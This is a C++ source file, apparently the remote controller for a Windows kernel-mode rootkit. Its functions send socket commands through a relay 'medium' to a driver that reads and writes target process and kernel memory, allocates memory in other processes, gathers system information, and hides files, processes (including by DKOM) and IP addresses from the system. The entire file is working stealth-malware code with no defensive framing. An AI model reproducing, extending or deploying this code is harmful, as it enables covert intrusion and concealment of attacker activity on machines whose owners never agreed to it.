#include "requests.h"
#pragma warning(disable : 6064)
#pragma warning(disable : 4473)


PVOID DriverCalls::GetModuleBaseRootkKMD(const char* ModuleName, SOCKET CommSocket) {
	ROOTKIT_MEMORY RootkInstructions = { 0 };
	PASS_DATA SocketResult = { 0 };
	BOOL OperationResult = FALSE;
	printf("=====GetModuleBaseAddress=====\n\n");
	RootkInstructions.Operation = RKOP_MDLBASE;


	// Pass all of the arguments of the operation to the medium:
	if (!PassString(CommSocket, ModuleName)) {
		printf("LOG: Could not pass the module name (%s) to medium :(\n", ModuleName);
		printf("==============================\n\n");
		return NULL;
	}
	RootkInstructions.MdlName = ModuleName;


	// Send request to medium:
	OperationResult = PassArgs(&RootkInstructions, CommSocket, TRUE);
	if (!OperationResult) {
		printf("LOG: Could not get the base address of %s (passing/receiving errors) :(\n", ModuleName);
		printf("==============================\n\n");
		return NULL;
	}


	// Parse results of operation:
	PrintStatusCode(RootkInstructions.StatusCode);
	PrintUnexpected(RootkInstructions.Unexpected);
	if (RootkInstructions.Out == NULL || RootkInstructions.Status == STATUS_UNSUCCESSFUL || RootkInstructions.Unexpected != successful) {
		printf("RESPONSE: Could not get the address of %s :(\n", ModuleName);
		printf("==============================\n\n");
		return NULL;
	}
	printf("RESPONSE: %s address base: %p :)\n", ModuleName, RootkInstructions.Out);
	printf("==============================\n\n");
	return RootkInstructions.Out;  // get module base address
}


bool DriverCalls::ReadFromRootkKMD(PVOID ReadAddress, PVOID DstBuffer, ULONG64 BufferSize, const char* ModuleName, SOCKET CommSocket, ROOTKIT_UNEXERR Err) {
	ROOTKIT_MEMORY RootkInstructions = { 0 };
	BOOL OperationResult = FALSE;
	PASS_DATA SocketResult = { 0 };
	char InitialFailureBuffer = 1;
	
	printf("\n=====ReadFromRootkKMD=====\n");
	RootkInstructions.Operation = RKOP_READ;


	// Pass the parameters for the operation to the medium:
	if (Err != successful) {
		SendData(CommSocket, &InitialFailureBuffer, sizeof(InitialFailureBuffer), FALSE, 0);
		printf("LOG: Could not pass data to medium - initial error :(\n");
		printf("==========================\n\n");
		return FALSE;
	}
	if (!PassString(CommSocket, ModuleName)) {
		printf("LOG: Could not pass read-from module name (%s) to medium :(\n", ModuleName);
		printf("==========================\n\n");
		return FALSE;
	}
	RootkInstructions.MdlName = ModuleName;
	RootkInstructions.Size = BufferSize;
	RootkInstructions.Buffer = ReadAddress;
	RootkInstructions.Out = DstBuffer;


	// Send request to medium:
	OperationResult = PassArgs(&RootkInstructions, CommSocket, FALSE);
	if (!OperationResult) {
		printf("LOG: Read operation from address %p did not succeed (passing/receiving struct) :(\n", ReadAddress);
		printf("==========================\n\n");
		return FALSE;
	}


	// Receive the read buffer:
	SocketResult = RecvData(CommSocket, (int)BufferSize, DstBuffer, FALSE, 0);
	if (SocketResult.err || SocketResult.value != BufferSize) {
		printf("LOG: Read operation from address %p did not succeed (passing/receiving struct/UNEXPECTED ERROR IN MEDIUM) :(\n", ReadAddress);
		printf("==========================\n\n");
		return FALSE;
	}
	

	// Receive and parse the results of the operation:
	SocketResult = RecvData(CommSocket, sizeof(ROOTKIT_MEMORY), &RootkInstructions, FALSE, 0);
	if (SocketResult.err || SocketResult.value != sizeof(ROOTKIT_MEMORY)) {
		printf("LOG: Read operation from address %p did not succeed (receiving later struct) :(\n", ReadAddress);
		printf("==========================\n\n");
		return FALSE;
	}
	PrintStatusCode(RootkInstructions.StatusCode);
	PrintUnexpected(successful);
	if (RootkInstructions.Status == STATUS_UNSUCCESSFUL) {
		printf("RESPONSE: Read operation from address %p did not succeed :(\n", ReadAddress);
		printf("==========================\n\n");
		return FALSE;;
	}
	if (ReadAddress != RootkInstructions.Buffer) {
		printf("LOG: Bending towards the allocation base of the source memory region changed the base address from the requested %p to %p\n", ReadAddress, RootkInstructions.Buffer);
	}
	printf("LOG: Reading from address %p concluded, can check the DstBuffer for values :)\n", ReadAddress);
	printf("Read value converted to string -> %s\n", (char*)DstBuffer);
	printf("==========================\n\n");
	return TRUE;
}


bool DriverCalls::WriteToRootkKMD(PVOID WriteAddress, PVOID SrcBuffer, ULONG WriteSize, const char* ModuleName, const char* SemiMdl, SOCKET CommSocket, ROOTKIT_UNEXERR Err, ULONG_PTR ZeroBits) {
	ROOTKIT_MEMORY RootkInstructions = { 0 };
	PASS_DATA SocketResult = { 0 };
	BOOL OperationResult = FALSE;
	char InitialFailureBuffer = 1;

	printf("\n=====WriteToRootkKMD=====\n");
	RootkInstructions.Operation = RKOP_WRITE;


	// Pass the arguments for the operation:
	if (Err != successful) {
		SendData(CommSocket, &InitialFailureBuffer, sizeof(InitialFailureBuffer), FALSE, 0);
		printf("LOG: Could not pass data to medium - initial error :(\n");
		printf("==========================\n\n");
		return FALSE;
	}
	if (!PassString(CommSocket, SemiMdl)) {
		printf("LOG: Could not pass write-from module name (%s) to medium :(\n", SemiMdl);
		printf("==========================\n\n");
		return FALSE;
	}
	RootkInstructions.MdlName = SemiMdl;
	if (!PassString(CommSocket, ModuleName)) {
		printf("LOG: Could not pass write-to module name (%s) to medium :(\n", ModuleName);
		printf("==========================\n\n");
		return FALSE;
	}
	RootkInstructions.DstMdlName = ModuleName;
	RootkInstructions.Size = WriteSize;
	RootkInstructions.Out = WriteAddress; // Address = virtual address in destination process / kernel mode address / buffer
	RootkInstructions.Buffer = SrcBuffer;  // not really used as the buffer is useless on another computer
	RootkInstructions.Reserved = (PVOID)ZeroBits;


	// Send request to medium:
	OperationResult = PassArgs(&RootkInstructions, CommSocket, FALSE);
	if (!OperationResult) {
		printf("LOG: Writing into address %p did not work (passing/receiving error) :(\n", WriteAddress);
		printf("=========================\n\n");
		return FALSE;
	}


	// If the writing source is user-supplied - send the buffer:
	if (strcmp(SemiMdl, REGULAR_BUFFER_WRITE) == 0) {
		SocketResult = SendData(CommSocket, SrcBuffer, WriteSize, FALSE, 0);
		if (SocketResult.err || SocketResult.value != WriteSize) {
			printf("LOG: Writing into address %p did not work (passing the regular buffer) :(\n", WriteAddress);
			printf("=========================\n\n");
			return FALSE;
		}
	}

	// Receive the results of the operation and parse them for the user:
	SocketResult = RecvData(CommSocket, sizeof(ROOTKIT_MEMORY), &RootkInstructions, FALSE, 0);
	if (SocketResult.err || SocketResult.value != sizeof(ROOTKIT_MEMORY)) {
		printf("LOG: Writing into address %p did not work (passing/receiving error) :(\n", WriteAddress);
		printf("=========================\n\n");
		return FALSE;
	}
	if (!OperationResult) {
		printf("LOG: Writing into address %p did not work (passing/receiving error) :(\n", WriteAddress);
		printf("=========================\n\n");
		return FALSE;
	}
	else {
		printf("LOG: Writing into address %p data passed to medium :)\n", WriteAddress);
	}


	// Print specific fields from the results that are relevant:
	PrintStatusCode(RootkInstructions.StatusCode);
	PrintUnexpected(RootkInstructions.Unexpected);
	if (WriteAddress != RootkInstructions.Out) {
		printf("LOG: Allocation and committing of the destination memory changed the base address from the requested %p to %p\n", WriteAddress, RootkInstructions.Out);
	}
	if (SrcBuffer != RootkInstructions.Buffer) {
		printf("LOG: Bending towards the allocation base of the source memory region changed the base address from the requested %p to %p\n", SrcBuffer, RootkInstructions.Buffer);
	}
	if (RootkInstructions.Status == STATUS_UNSUCCESSFUL || RootkInstructions.Unexpected != successful) {
		printf("LOG: Writing into address %p did not work :(\n", WriteAddress);
		printf("=========================\n\n");
		return FALSE;
	}
	printf("LOG: Writing into address %p concluded :)\n", WriteAddress);
	printf("=========================\n\n");
	return TRUE;
}


BOOL DriverCalls::ValidateInfoTypeString(const char* InfoType) {
	if (strlen(InfoType) > 5 || strlen(InfoType) == 0) {
		return FALSE;
	}

	std::string cppString("rbptcPieIL");
	for (int i = 0; InfoType[i] != '\0'; i++) {
		if (cppString.find(InfoType[i]) == std::string::npos) {
			return FALSE;
		}
	}
	return TRUE;
}


BOOL DriverCalls::GetSystemInfoRootkKMD(const char* InfoTypes, SOCKET CommSocket, ROOTKIT_MEMORY* RootkInstructions, const char* ModuleName, char* ProcessorsNum) {
	ULONG64 SysInfoBufferSize = 0;
	ULONG64 SysInfoBufferOffset = 0;
	PVOID AttrBuffer = NULL;
	char InitialFailureBuffer = 1;
	RKSYSTEM_INFORMATION_CLASS SysType;
	PASS_DATA SocketResult = { 0 };
	BOOL OperationResult = FALSE;
	ULONG64 AttrBufferSize = (ULONG64)(sizeof(SysType) * strlen(InfoTypes));
	PVOID SysDataBuffer = NULL;

	printf("\n=====GetSystemInformation=====\n");
	RootkInstructions->Operation = RKOP_SYSINFO;


	// Pass the arguments for the operation:
	if (!PassString(CommSocket, InfoTypes)) {
		printf("ERROR: Could not pass info types string (%s) to medium :(\n", InfoTypes);
		printf("==============================\n\n");
		return FALSE;
	}
	RootkInstructions->MdlName = InfoTypes;
	if (!ValidateInfoTypeString(InfoTypes)) {
		printf("ERROR: Invalid info request string :(\n");
		printf("==============================\n\n");
		return FALSE;
	}


	// Make the initial buffer to specify the attributes of each information request:
	AttrBuffer = malloc(AttrBufferSize);
	if (AttrBuffer == NULL) {
		printf("ERROR: Cannot allocate buffer for attributes initial :(\n");
		printf("==============================\n\n");
		SendData(CommSocket, &InitialFailureBuffer, sizeof(InitialFailureBuffer), FALSE, 0);
		return FALSE;
	}

	// Fill up the attribute buffer with the correct info type and flag for memory pool:
	for (ULONG64 AttrOffs = 0; AttrOffs < AttrBufferSize; AttrOffs += sizeof(SysType)) {
		SysType.InfoType = ReturnSystemInfo(InfoTypes[AttrOffs / sizeof(SysType)]);
		SysType.ReturnStatus = (ROOTKIT_STATUS)(0x7F7F7F7F7F8F8F00 + (AttrOffs / sizeof(SysType)));
		SysType.InfoSize = 0;
		SysType.PoolBuffer = NULL;
		memcpy((PVOID)((ULONG64)AttrBuffer + AttrOffs), &SysType, sizeof(SysType));
	}

	// Send the attribute buffer:
	SocketResult = SendData(CommSocket, &AttrBufferSize, sizeof(AttrBufferSize), FALSE, 0);
	if (SocketResult.err || SocketResult.value != sizeof(AttrBufferSize)) {
		printf("ERROR: Cannot send size of buffer of attributes initials :(\n");
		printf("==============================\n\n");
		free(AttrBuffer);
		return FALSE;
	}
	SocketResult = SendData(CommSocket, AttrBuffer, (int)AttrBufferSize, FALSE, 0);
	if (SocketResult.err || SocketResult.value != AttrBufferSize) {
		printf("ERROR: Cannot send buffer of attributes initials :(\n");
		printf("==============================\n\n");
		free(AttrBuffer);
		return FALSE;
	}

	// Pass and receive the arguments and results of the operation from medium:
	OperationResult = PassArgs(RootkInstructions, CommSocket, TRUE);
	if (!OperationResult) {
		printf("ERROR: Cannot pass parameters through socket :(\n");
		printf("==============================\n\n");
		free(AttrBuffer);
		return FALSE;
	}
	if (RootkInstructions->Unexpected != successful) {
		printf("Unexpected error has occurred on medium when trying to perform the operation to get system information:\n");
		PrintUnexpected(RootkInstructions->Unexpected);
		free(AttrBuffer);
		return FALSE;
	}


	// Receive the actual system information from the medium:
	SocketResult = RecvData(CommSocket, sizeof(SysInfoBufferSize), &SysInfoBufferSize, FALSE, 0);
	if (SocketResult.err || SocketResult.value != sizeof(SysInfoBufferSize)) {
		free(AttrBuffer);
		return FALSE;
	}
	SysDataBuffer = malloc(SysInfoBufferSize);
	if (SysDataBuffer == NULL) {
		free(AttrBuffer);
		return FALSE;
	}
	SocketResult = RecvData(CommSocket, (int)SysInfoBufferSize, SysDataBuffer, FALSE, 0);
	if (SocketResult.err || SocketResult.value != SysInfoBufferSize) {
		printf("Error in system info might have been because medium could not receive the size of the buffer\n");
		free(SysDataBuffer);
		free(AttrBuffer);
		return FALSE;
	}


	// Receive the renewed attribute buffer from the medium:
	SocketResult = RecvData(CommSocket, (int)AttrBufferSize, AttrBuffer, FALSE, 0);
	if (SocketResult.err || SocketResult.value != AttrBufferSize) {
		free(SysDataBuffer);
		free(AttrBuffer);
		return FALSE;
	}


	// Parse data:
	printf("\n--------------------\nKERNEL DATA PARSE OF SYSTEM INFORMATION:\n--------------------\n");
	for (ULONG64 AttrOffs = 0; AttrOffs < AttrBufferSize; AttrOffs += sizeof(SysType)) {
		printf("System information request number %llu:\n", (AttrOffs / sizeof(SysType)));
		memcpy(&SysType, (PVOID)((ULONG64)AttrBuffer + AttrOffs), sizeof(SysType));
		if (SysType.InfoSize == 0) {
			printf("No available info (initial setup of specific request failed)\n");
		}
		else {
			PrintStatusCode(SysType.ReturnStatus);
			if (SysType.ReturnStatus == ROOTKSTATUS_SUCCESS) {
				PrintSystemInformation((PVOID)((ULONG64)SysDataBuffer + SysInfoBufferOffset), InfoTypes[(AttrOffs / sizeof(SysType))], SysType.ReturnStatus, (DWORD)(AttrOffs / sizeof(SysType)), (ULONG64)SysType.InfoSize, ProcessorsNum);
			}
			SysInfoBufferOffset += SysType.InfoSize;
		}
	}
	free(SysDataBuffer);
	free(AttrBuffer);
	printf("\n==============================\n\n");
	return TRUE;
}


PVOID DriverCalls::SpecAllocRootkKMD(PVOID AllocAddress, ULONG64 AllocSize, const char* ModuleName, SOCKET CommSocket, ROOTKIT_UNEXERR Err, ULONG_PTR ZeroBits) {
	ROOTKIT_MEMORY RootkInstructions = { 0 };
	BOOL OperationResult = FALSE;
	char InitialFailureBuffer = 1;

	printf("\n=====SpecAllocRootkKMD=====\n");
	RootkInstructions.Operation = RKOP_PRCMALLOC;


	// Send parameters for the operation:
	if (Err != successful) {
		SendData(CommSocket, &InitialFailureBuffer, sizeof(InitialFailureBuffer), FALSE, 0);
		printf("LOG: Could not pass data to medium - INITIAL ERROR :(\n");
		printf("\n===========================\n");
		return NULL;
	}
	if (!PassString(CommSocket, ModuleName)) {
		printf("LOG: Could not pass allocation module name (%s) to medium :(\n", ModuleName);
		printf("\n===========================\n");
		return NULL;
	}
	RootkInstructions.MdlName = ModuleName;
	RootkInstructions.Size = AllocSize;
	RootkInstructions.Buffer = AllocAddress;
	RootkInstructions.Reserved = (PVOID)ZeroBits;


	// Send request to medium:
	OperationResult = PassArgs(&RootkInstructions, CommSocket, TRUE);
	if (!OperationResult) {
		printf("LOG: Allocation operation for address %p did not succeed (passing/receiving struct) :(\n", AllocAddress);
		printf("\n===========================\n");
		return NULL;
	}


	// Parse results of operation:
	PrintStatusCode(RootkInstructions.StatusCode);
	PrintUnexpected(successful);
	if (RootkInstructions.Status == STATUS_UNSUCCESSFUL) {
		printf("RESPONSE: Allocation operation for address %p did not succeed :(\n", AllocAddress);
		printf("\n===========================\n");
		return NULL;
	}
	if (RootkInstructions.Out != RootkInstructions.Buffer) {
		printf("LOG: Alignment of the source memory region changed the base address from the requested %p to %p\n", RootkInstructions.Buffer, RootkInstructions.Out);
	}
	printf("SUCCESS: Allocation for address %p concluded :)\n", RootkInstructions.Out);
	printf("\n===========================\n");
	return RootkInstructions.Out;
}


BOOL DriverCalls::HideFileRootkKMD(char ModuleName[], WCHAR FilePath[], int RemoveIndex, SOCKET CommSocket, NTSTATUS RequestStatus) {
	ROOTKIT_MEMORY RootkInstructions = { 0 };
	PASS_DATA SocketResult = { 0 };
	DWORD PathLength = 0;  // Actual length, wcslen(str) * sizeof(WCHAR), without nullterm
	WCHAR CurrentCharacter = L'\0';
	PVOID HiddenFiles = NULL;
	BOOL OperationResult = FALSE;

	printf("=====HideFileOrFolder=====\n\n");
	RootkInstructions.Operation = RKOP_HIDEFILE;


	// Pass initial string:
	if (!PassString(CommSocket, ModuleName)) {
		printf("LOG: Could not pass allocation module name (%s) to medium :(\n", ModuleName);
		printf("==========================\n\n");
		return FALSE;
	}


	// Pass status of type of file manipulation:
	SocketResult = SendData(CommSocket, &RequestStatus, sizeof(NTSTATUS), FALSE, 0);
	if (SocketResult.err || SocketResult.value != sizeof(NTSTATUS)) {
		printf("LOG: Could not perform manipulations of files/folders (passing/receiving errors) :(\n");
		printf("==========================\n\n");
		return FALSE;
	}


	// Pass preprocessing parameters (if needed) and set struct values:
	switch (RequestStatus) {
	case HIDE_FILEFOLDER:
		PathLength = (wcslen(FilePath) + 1) * sizeof(WCHAR);
		SocketResult = SendData(CommSocket, &PathLength, sizeof(DWORD), FALSE, 0);
		if (SocketResult.err || SocketResult.value != sizeof(DWORD)) {
			printf("LOG: Could not perform manipulations of files/folders (passing/receiving errors) :(\n");
			printf("==========================\n\n");
			return FALSE;
		}	
		SocketResult = SendData(CommSocket, FilePath, PathLength, FALSE, 0);
		if (SocketResult.err || SocketResult.value != PathLength) {
			printf("LOG: Could not perform manipulations of files/folders (passing/receiving errors) :(\n");
			printf("==========================\n\n");
			return FALSE;
		}
		RootkInstructions.Reserved = (PVOID)HIDE_FILE;
		break;
	case UNHIDE_FILEFOLDER:
		RootkInstructions.Reserved = (PVOID)RemoveIndex;
		break;
	default:
		RootkInstructions.Reserved = (PVOID)SHOW_HIDDEN;

	}


	// Pass all of the arguments of the operation to the medium:
	OperationResult = PassArgs(&RootkInstructions, CommSocket, TRUE);
	if (!OperationResult) {
		printf("LOG: Could not perform manipulations of files/folders (passing/receiving errors) :(\n");
		printf("==========================\n\n");
		return FALSE;
	}


	// Parse results of operation:
	PrintStatusCode(RootkInstructions.StatusCode);
	PrintUnexpected(RootkInstructions.Unexpected);
	if (RootkInstructions.Status == STATUS_UNSUCCESSFUL) {
		printf("RESPONSE: Could not perform manipulations of files/folders - did not succeed :(\n");
		printf("\n===========================\n");
		return FALSE;
	}
	

	// Parse output for specific requests:
	if (RequestStatus == SHOWHIDDEN_FILEFOLDER) {
		if (RootkInstructions.Size == 0) {
			printf("RESPONSE: Could not perform manipulations of files/folders - listing request returned list with size of 0 bytes :(\n");
			printf("\n===========================\n");
			return FALSE;
		}
		HiddenFiles = malloc(RootkInstructions.Size);
		if (HiddenFiles == NULL) {
			printf("RESPONSE: Could not perform manipulations of files/folders - could not allocate memory for list :(\n");
			printf("\n===========================\n");
			return FALSE;
		}
		SocketResult = RecvData(CommSocket, RootkInstructions.Size, HiddenFiles, FALSE, 0);
		if (SocketResult.err || SocketResult.value != RootkInstructions.Size) {
			printf("Error in system info might have been because medium could not receive the size of the buffer\n");
			printf("\n===========================\n");
			return FALSE;
		}
		printf("Currently hidden files (dynamically):\n");
		for (int bufferi = 0; bufferi < RootkInstructions.Size; bufferi += sizeof(WCHAR)) {
			RtlCopyMemory(&CurrentCharacter, (PVOID)((ULONG64)HiddenFiles + bufferi), sizeof(WCHAR));
			if (CurrentCharacter == L'|') {
				printf("\n");
			}
			else {
				wprintf(L"%c", CurrentCharacter);
			}
		}
		printf("\n");
	}
	printf("RESPONSE: Manipulations of files/folders succeeded :)\n");
	printf("\n===========================\n");
	return TRUE;
}


BOOL DriverCalls::HideProcessRootkKMD(char ModuleName[], BOOL IS_DKOM, int ProcessId, int RemoveIndex, SOCKET CommSocket, NTSTATUS RequestStatus) {
	ROOTKIT_MEMORY RootkInstructions = { 0 };
	PASS_DATA SocketResult = { 0 };
	PVOID HiddenProcesses = NULL;
	SHORTENEDACTEPROCESS CurrentProcess = { 0 };
	ULONG64 CurrentProcessId = 0;
	int CurrentIndex = 0;
	BOOL OperationResult = FALSE;

	printf("=====HideProcess=====\n\n");
	RootkInstructions.Operation = RKOP_HIDEPROC;


	// Pass initial string:
	if (!PassString(CommSocket, ModuleName)) {
		printf("LOG: Could not pass allocation module name (%s) to medium :(\n", ModuleName);
		printf("=====================\n\n");
		return FALSE;
	}


	// Pass status of type of process manipulation:
	SocketResult = SendData(CommSocket, &RequestStatus, sizeof(NTSTATUS), FALSE, 0);
	if (SocketResult.err || SocketResult.value != sizeof(NTSTATUS)) {
		printf("LOG: Could not perform manipulations of processes (passing/receiving errors) :(\n");
		printf("=====================\n\n");
		return FALSE;
	}


	// Pass preprocessing parameters (if needed) and set struct values:
	switch (RequestStatus) {
	case HIDE_PROCESS:
		RootkInstructions.MainPID = (ULONG64)ProcessId;
		RootkInstructions.Reserved = (PVOID)HideProcess;
		break;
	case UNHIDE_PROCESS:
		if (RemoveIndex != -1) {
			RootkInstructions.SemiPID = (ULONG64)RemoveIndex;
			RootkInstructions.MainPID = REMOVE_BY_INDEX_PID;
		}
		else {
			RootkInstructions.SemiPID = 0;
			RootkInstructions.MainPID = (ULONG64)ProcessId;
		}
		RootkInstructions.Reserved = (PVOID)UnhideProcess;
		break;
	default:
		RootkInstructions.Reserved = (PVOID)ListHiddenProcesses;
		break;
	}


	// Pass all of the arguments of the operation to the medium:
	OperationResult = PassArgs(&RootkInstructions, CommSocket, TRUE);
	if (!OperationResult) {
		printf("LOG: Could not perform manipulations of processes (passing/receiving errors) :(\n");
		printf("=====================\n\n");
		return FALSE;
	}


	// Parse results of operation:
	PrintStatusCode(RootkInstructions.StatusCode);
	PrintUnexpected(RootkInstructions.Unexpected);
	if (RootkInstructions.Status == STATUS_UNSUCCESSFUL) {
		printf("RESPONSE: Could not perform manipulations of processes - did not succeed :(\n");
		printf("=====================\n\n");
		return FALSE;
	}


	// Parse output for specific requests:
	if (RequestStatus == SHOWHIDDEN_PROCESS) {
		if (RootkInstructions.Size == 0) {
			printf("RESPONSE: Could not perform manipulations of processes - listing request returned list with size of 0 bytes :(\n");
			printf("=====================\n\n");
			return FALSE;
		}
		HiddenProcesses = malloc(RootkInstructions.Size);
		if (HiddenProcesses == NULL) {
			printf("RESPONSE: Could not perform manipulations of processes - could not allocate memory for list :(\n");
			printf("\n===========================\n");
			return FALSE;
		}
		SocketResult = RecvData(CommSocket, RootkInstructions.Size, HiddenProcesses, FALSE, 0);
		if (SocketResult.err || SocketResult.value != RootkInstructions.Size) {
			printf("Error in system info might have been because medium could not receive the size of the buffer\n");
			printf("\n===========================\n");
			free(HiddenProcesses);
			return FALSE;
		}
		printf("Currently hidden processes (dynamically):\n");
		if (!IS_DKOM) {
			for (ULONG PidIndex = 0; PidIndex < RootkInstructions.Size; PidIndex += sizeof(ULONG64)) {
				RtlCopyMemory(&CurrentProcessId, (PVOID)((ULONG64)HiddenProcesses + PidIndex), sizeof(CurrentProcessId));
				printf("Process number %llu - %llu\n", PidIndex / sizeof(ULONG64), CurrentProcessId);
			}
		}
		else {
			for (ULONG64 hiddeni = 0; hiddeni < RootkInstructions.Size; hiddeni += sizeof(SHORTENEDACTEPROCESS)) {
				RtlCopyMemory(&CurrentProcess, (PVOID)((ULONG64)HiddenProcesses + hiddeni), sizeof(SHORTENEDACTEPROCESS));
				printf("Process number %llu -\n", hiddeni / sizeof(SHORTENEDACTEPROCESS));
				ParseEprocess(CurrentProcess);
			}
		}
	}
	printf("RESPONSE: Manipulations of processes succeeded :)\n");
	printf("\n===========================\n");
	free(HiddenProcesses);
	return TRUE;
}


BOOL DriverCalls::HideNetworkingRootkKMD(char ModuleName[], char* IpAddress, USHORT RemoveIndex, SOCKET CommSocket, NTSTATUS RequestStatus) {
	ROOTKIT_MEMORY RootkInstructions = { 0 };
	ULONG AddressValue = 0;
	ULONG CurrentHiddenValue = 0;
	PASS_DATA SocketResult = { 0 };
	PVOID HiddenIpAddresses = NULL;
	char CurrentHiddenAddress[MAX_PATH] = { 0 };
	int CurrentIndex = 0;
	BOOL OperationResult = FALSE;

	printf("=====HideNetworking=====\n\n");
	RootkInstructions.Operation = RKOP_HIDEADDR;


	// Pass initial string:
	if (!PassString(CommSocket, ModuleName)) {
		printf("LOG: Could not pass allocation module name (%s) to medium :(\n", ModuleName);
		printf("========================\n\n");
		return FALSE;
	}


	// Pass status of type of network communication manipulation:
	SocketResult = SendData(CommSocket, &RequestStatus, sizeof(NTSTATUS), FALSE, 0);
	if (SocketResult.err || SocketResult.value != sizeof(NTSTATUS)) {
		printf("LOG: Could not perform manipulations of network communication (passing/receiving errors) :(\n");
		printf("========================\n\n");
		return FALSE;
	}


	// Pass preprocessing parameters (if needed) and set struct values:
	AddressValue = GeneralUtils::CalculateAddressValue(IpAddress);
	if (AddressValue == 0) {
		printf("LOG: Could not perform manipulations of network communication (cannot calculate address value) :(\n");
		printf("========================\n\n");
		return FALSE;
	}
	switch (RequestStatus) {
	case HIDE_ADDR:
		RootkInstructions.Buffer = (PVOID)AddressValue;
		RootkInstructions.Reserved = 0;
		RootkInstructions.Size = HideAddress;
		break;
	case UNHIDE_ADDR:
		if (RemoveIndex != -1) {
			RootkInstructions.Buffer = (PVOID)REMOVE_BY_INDEX_ADDR;
			RootkInstructions.Reserved = (PVOID)RemoveIndex;
		}
		else {
			RootkInstructions.Buffer = (PVOID)AddressValue;
			RootkInstructions.Reserved = 0;
		}
		RootkInstructions.Size = UnhideAddress;
		break;
	default:
		RootkInstructions.Size = ListHiddenAddresses;
		break;
	}


	// Pass all of the arguments of the operation to the medium:
	OperationResult = PassArgs(&RootkInstructions, CommSocket, TRUE);
	if (!OperationResult) {
		printf("LOG: Could not perform manipulations of network communication (passing/receiving errors) :(\n");
		printf("========================\n\n");
		return FALSE;
	}


	// Parse results of operation:
	PrintStatusCode(RootkInstructions.StatusCode);
	PrintUnexpected(RootkInstructions.Unexpected);
	if (RootkInstructions.Status == STATUS_UNSUCCESSFUL) {
		printf("RESPONSE: Could not perform manipulations of network communication - did not succeed :(\n");
		printf("========================\n\n");
		return FALSE;
	}


	// Parse output for specific requests:
	if (RequestStatus == SHOWHIDDEN_ADDRS) {
		if (RootkInstructions.Size == 0) {
			printf("RESPONSE: Could not perform manipulations of network communication - listing request returned list with size of 0 bytes :(\n");
			printf("========================\n\n");
			return FALSE;
		}
		HiddenIpAddresses = malloc(RootkInstructions.Size);
		if (HiddenIpAddresses == NULL) {
			printf("RESPONSE: Could not perform manipulations of network communication - could not allocate memory for list :(\n");
			printf("========================\n\n");
			return FALSE;
		}
		SocketResult = RecvData(CommSocket, RootkInstructions.Size, HiddenIpAddresses, FALSE, 0);
		if (SocketResult.err || SocketResult.value != RootkInstructions.Size) {
			printf("Error in system info might have been because medium could not receive the size of the buffer\n");
			printf("========================\n\n");
			free(HiddenIpAddresses);
			return FALSE;
		}
		printf("Currently hidden IP addresses (dynamically):\n");
		RtlCopyMemory(&CurrentHiddenValue, (PVOID)((ULONG64)HiddenIpAddresses + (CurrentIndex * sizeof(ULONG))), sizeof(ULONG));
		while (CurrentHiddenValue != 0xFFFFFFFF) {
			if (GeneralUtils::CalculateAddressString(CurrentHiddenAddress,
				CurrentHiddenValue)) {
				printf("Address at index %d - %s\n", CurrentIndex, CurrentHiddenAddress);
			}
			else {
				printf("Address at index %d - 0x%X, unresolved\n", CurrentIndex, CurrentHiddenValue);
			}
			CurrentIndex++;
			RtlCopyMemory(&CurrentHiddenValue, (PVOID)((ULONG64)HiddenIpAddresses + (CurrentIndex * sizeof(ULONG))), sizeof(ULONG));
		}
	}
	printf("RESPONSE: Manipulations of network communication succeeded :)\n");
	printf("\n========================\n");
	free(HiddenIpAddresses);
	return TRUE;
}